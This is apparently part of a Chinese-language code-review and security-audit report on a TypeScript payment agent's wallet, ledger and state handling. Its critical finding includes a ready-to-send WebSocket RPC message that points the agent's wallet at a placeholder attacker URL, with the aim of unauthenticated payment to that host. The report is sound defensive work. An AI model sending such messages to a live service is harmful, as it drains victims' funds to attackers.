## 2. 必须修（2 条，按影响排序）

**A. CRITICAL — 无鉴权 WS RPC 可远程驱动 agent 钱包真实付款（安全/权限层）**
- 位置：`src/agent.ts` L583-646（`@callable payExternalEndpoint`，L606 调 `payX402EndpointWithReceipt`，fail-closed 分支 L591）；`src/api.ts` 的 `/ws` 路由（无 `requireAuth`，仅检查 `Upgrade` 头后 `agent.fetch(req.raw)`；行号未及保存）；`node_modules/agents/dist/index.js` RPC 分发 ~L412-450、`shouldConnectionBeReadonly` L695（默认 false）；`.github/workflows/deploy.yml`（`wrangler secret put PAYMENT_PRIVATE_KEY`）。
- 问题：移植前该方法只是硬编码 403 桩；移植后成为真实付款入口，而 `/ws` 无鉴权、SDK 默认允许连接调用任意 `@callable` 方法，生产环境又确实注入 `PAYMENT_PRIVATE_KEY` → L591 的 fail-closed 分支在生产不生效。
- 影响：任意互联网用户连上 `pay.openaimp.com/ws` 发 `{type:"rpc",method:"payExternalEndpoint",args:{url:"https://attacker/..."}}`，即可让 agent 钱包向攻击者端点付款；金额/资产/网络完全由攻击者服务器返回的 402 challenge 决定（`src/payments.ts` L258 起解析 `accepts[0]`，无上限、无白名单）。
- 依据：上述行号的代码片段 + SDK 分发机制（RPC 无鉴权、默认非只读）+ deploy.yml 注入生产密钥。**静态核实，未做活体 PoC**。
- 修复方向：`/ws` 加鉴权（或覆盖连接为只读、仅放行只读方法）；`payExternalEndpoint` 增加管理凭据校验 + 金额上限/收款白名单（走环境变量配置）。

**B. HIGH — PaymentRecord 与真实支付不一致，可记录"从未发生的付款"（正确性层）**
- 位置：`src/agent.ts` L611-625（PaymentRecord 字面量）、L627（`totalPaymentsSent+1`）；`src/payments.ts` L258 起（非 402 时不付款、`txHash` 为空；`sendTransaction` 不等 receipt）。
- 问题（同根因合并 4 个子项）：
  1. 端点**未返 402**（根本没付款）时，代码仍写 `direction:"sent"` 记录并 `totalPaymentsSent+1`，`status` 取 `response.ok` → 200 就记 "confirmed"——账本凭空多出一笔付款；
  2. `amount/currency/network` 硬编码 `"10000"/"USDC"/"base"`，与 challenge 实际要求的资产/金额/网络不符；
  3. `fromAddress` 写的却是收款常量 `PAY_TO_ADDRESS`，`toAddress` 写 URL（而非 challenge 的 `payTo`），字段语义错误；
  4. `status` 由 HTTP 状态而非链上 receipt 判定；链上已付但端点返非 2xx 会记 "failed"，抛出路径（L639-646 返 502）完全不落账。
- 影响：账本是本产品核心数据，系统性失真；上游消费者会读到不存在/参数错误的付款。
- 依据：上述行号处代码，及 `payX402EndpointWithReceipt` 非 402 时 `txHash` 为空但上层仍落账的调用链。
- 修复方向：仅在真实发生支付时落账，并记 challenge 的实际 `asset/amount/network/payTo`；sender 地址由付款私钥推导；`status` 改以 receipt（或后续校正）为准；失败也落一条 failed 记录。

## 3. 值得考虑（4 条）

- **P. MEDIUM — state 读改写跨越网络 await（丢更新风险）**：`src/agent.ts` L603 `const state = this.ensureState()` → 付款网络调用（await）→ L627 `this.setState({...state, ...})`。期间其他事件（webhook/邮件路径）若已 `setState`，回写会覆盖其更新。sibling 方法写法与 DO 事件交错语义未及二次核对（预算耗尽）；建议支付前重取 state，或把读-改-写收进无 await 的同步段/改存储原子更新。
